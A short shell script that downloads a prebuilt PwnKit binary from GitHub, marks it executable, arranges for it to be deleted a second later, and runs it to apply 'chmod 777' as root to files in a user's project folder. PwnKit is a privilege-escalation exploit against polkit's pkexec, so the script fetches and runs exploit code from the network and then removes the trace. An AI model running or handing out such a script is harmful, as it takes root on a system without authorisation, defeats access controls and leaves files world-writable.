curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit chmod 777 /home/ivan/Covid19IA/*
